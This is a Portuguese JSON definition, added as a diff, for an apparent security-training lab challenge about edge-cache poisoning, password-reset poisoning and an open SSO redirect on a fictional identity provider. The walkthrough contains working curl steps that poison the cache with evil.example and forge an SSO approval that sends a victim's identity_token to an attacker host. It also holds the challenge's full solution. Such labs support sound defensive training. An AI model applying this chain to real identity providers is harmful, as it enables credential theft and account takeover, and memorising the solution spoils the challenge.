@@ -1,0 +1,84 @@
+{
+  "slug": "adv-http-host-header-reset",
+  "title": "A região que nunca existiu",
+  "codename": "MISTRAL ID",
+  "summary": "A cache de borda do Mistral ID armazena a home page anônima apenas pelo path, mas a página embute links absolutos construídos a partir de um rótulo de tenant e de um header de sufixo da borda que não fazem parte da cache key. Um request redireciona o dashboard, o e-mail de recuperação e a aprovação de SSO de todos os visitantes seguintes para uma borda do atacante.",
+  "category": "advanced",
+  "difficulty": "hard",
+  "kind": "challenge",
+  "lab_dir": "adv-http-host-header-reset",
+  "estimated_minutes": 30,
+  "xp": 360,
+  "tech": [
+    "Flask",
+    "HTTP",
+    "Edge caching",
+    "Open redirect",
+    "SSO"
+  ],
+  "tags": [
+    "host-header-injection",
+    "cache-poisoning",
+    "password-reset-poisoning",
+    "open-redirect",
+    "web-cache"
+  ],
+  "story": "O Mistral ID é um identity provider compartilhado. As implantações regionais são renderizadas a partir de um rótulo de tenant (`?tenant=`) e do header de sufixo da borda (`X-Edge-Suffix`), para que cada região aponte de volta ao seu próprio nome público. A landing page é cacheada para todos os visitantes anônimos por cinco minutos, com chave apenas pelo path. O fluxo de aprovação de SSO aceita qualquer host em `redirect_uri` e encaminha o token de identidade através do redirect. O time de segurança revisou o formulário de login, não a cache key.",
+  "objective": "Envenene a cache de borda compartilhada para que o link do dashboard de um visitante limpo aponte para um host do atacante, confirme que a página cacheada serve o link envenenado e demonstre o token de identidade deixando a origem através do redirect de SSO.",
+  "rules": "Permaneça na origem loopback atribuída. A cache de borda, o collector e o fluxo de SSO fazem parte do lab. Use apenas `127.0.0.1` e a porta do lab; nenhum host externo é contatado.",
+  "flags": [
+    {
+      "key": "flag",
+      "label": "Token de identidade da vítima",
+      "flag_type": "user",
+      "points": 360,
+      "required": true,
+      "requires_objective": true
+    }
+  ],
+  "hints": [
+    {
+      "level": 1,
+      "title": "Leia o monitor de cache",
+      "body": "`GET /cache` mostra o body armazenado de `/home` e sua key. Compare a key com o que a página embute: os links absolutos mudam com o request, mas a key não.",
+      "cost": 20
+    },
+    {
+      "level": 2,
+      "title": "Os parâmetros de pré-visualização também são inputs",
+      "body": "`GET /` renderiza um `Preview base URL` a partir de `?tenant=` e do header `X-Edge-Suffix`. `/home` embute o mesmo valor em todos os links absolutos. Requeira `/home?tenant=evil.example/x` após fazer purge em `/cache/reset` e depois requeira `/home` sem parâmetros: a segunda response é um cache HIT que ainda contém `evil.example`.",
+      "cost": 30
+    },
+    {
+      "level": 3,
+      "title": "Saia pela porta da frente",
+      "body": "A página `/home` envenenada aponta o dashboard, `/reset` e `/sso/start` para o host do atacante. `/sso/authorize?redirect_uri=<qualquer host>` aprova o bounce com `identity_token` anexado à URL, e `/reset` envia por e-mail um link construído a partir da mesma base não validada. Confirme que o token chega a `/collect` e aparece em `/captured`.",
+      "cost": 40
+    }
+  ],
+  "solution": {
+    "walkthrough": "Todos os requests miram a origem do lab (`http://127.0.0.1:PORT`).\n\n**Passo 1 — confirme que a cache tem chave por path.**\n\n```bash\ncurl -s http://127.0.0.1:PORT/cache/reset\ncurl -si http://127.0.0.1:PORT/home?tenant=evil.example/x | grep -i x-cache\n# X-Cache: MISS  (body contains http://evil.example/x/dashboard)\ncurl -si http://127.0.0.1:PORT/home | grep -i x-cache\n# X-Cache: HIT   (same body, no parameters sent)\n```\n\nO segundo request não tem rótulo de tenant, mas o body cacheado ainda diz `Canonical site: http://evil.example/x/` e todos os links apontam para lá.\n\n**Passo 2 — leia os links envenenados a partir do cache hit.**\n\n```bash\ncurl -s http://127.0.0.1:PORT/home | grep evil.example\n# <a href=\"http://evil.example/x/dashboard\">\n# <a href=\"http://evil.example/x/settings\">\n# <a href=\"http://evil.example/x/reset\">\n# <a href=\"http://evil.example/x/sso/start?continue=/dashboard\">\n```\n\n**Passo 3 — a vítima navega normalmente.** Com `identity_token` definido, `GET /dashboard` renderiza o token, e `GET /me` o retorna como JSON para qualquer chamador que dependa do cookie. O link cacheado envia esse browser para `http://evil.example/x/dashboard`.\n\n**Passo 4 — a mesma base não validada no e-mail de recuperação.**\n\n```bash\ncurl -s -X POST 'http://127.0.0.1:PORT/login?tenant=evil.example/x' \\\n  -d 'email=analyst@mistral-id.example'\n# Reset your password:  http://evil.example/x/reset/confirm?t=...\n```\n\n**Passo 5 — a aprovação de SSO em um clique encaminha o token.**\n\n```bash\ncurl -si 'http://127.0.0.1:PORT/sso/start?tenant=evil.example/x'\n# Location: /sso/authorize?ticket=...&redirect_uri=http://evil.example/x/dashboard\ncurl -si -X POST http://127.0.0.1:PORT/sso/authorize \\\n  -H 'Cookie: identity_token=<victim token>' \\\n  -d 'redirect_uri=http://evil.example/harvest&ticket=k1'\n# Location: http://evil.example/harvest?identity_token=RV%%7B...%%7D\n```\n\n**Passo 6 — colete.**\n\n```bash\ncurl -s 'http://127.0.0.1:PORT/collect?c=RV%7B...%7D'\ncurl -s http://127.0.0.1:PORT/captured   # flag listada\n```",
+    "root_cause": "Três falhas se alinham. Primeiro, a URL base absoluta é reconstruída a partir de um parâmetro de query unkeyed (`tenant`) e de um header de request unkeyed (`X-Edge-Suffix`) sem allow-list. Segundo, a borda cacheia `/home` apenas pelo path enquanto o body deriva desses inputs, então o primeiro request após um purge grava uma response que todos os visitantes recebem. Terceiro, o endpoint de aprovação de SSO aceita qualquer `redirect_uri` e anexa o token de identidade a ele, então um link envenenado ou um request de aprovação forjado vaza a credencial mesmo que o cookie esteja corretamente escopado.",
+    "mitigation": "Construa URLs absolutas a partir da configuração do servidor (um `SERVER_NAME` fixo por implantação), nunca de headers de request ou query strings. Remova na borda headers de forwarding enviados pelo cliente, inclua na cache key todo input que molda uma response, ou não cacheie HTML derivado de dados personalizados. Para SSO, exija um `redirect_uri` pré-registrado com correspondência exata por cliente e nunca anexe tokens a URLs (use authorization code + PKCE). Adicione uma CSP estrita e `Cache-Control: private` em qualquer coisa renderizada por request."
+  },
+  "references": [
+    {
+      "title": "PortSwigger — Web cache poisoning",
+      "url": "https://portswigger.net/web-security/web-cache-poisoning",
+      "source_type": "official",
+      "description": "Inputs unkeyed, construção de cache key e impacto do poisoning."
+    },
+    {
+      "title": "PortSwigger — Host header attack",
+      "url": "https://portswigger.net/web-security/host-header",
+      "source_type": "official",
+      "description": "URLs absolutas reconstruídas a partir de headers controlados pelo atacante e o caminho de poison no password reset."
+    },
+    {
+      "title": "OWASP WSTG — Testing for Host Header Injection",
+      "url": "https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/17-Testing_for_Host_Header_Injection",
+      "source_type": "standard",
+      "description": "Metodologia para injeção de URL absoluta guiada por header."
+    }
+  ]
+}
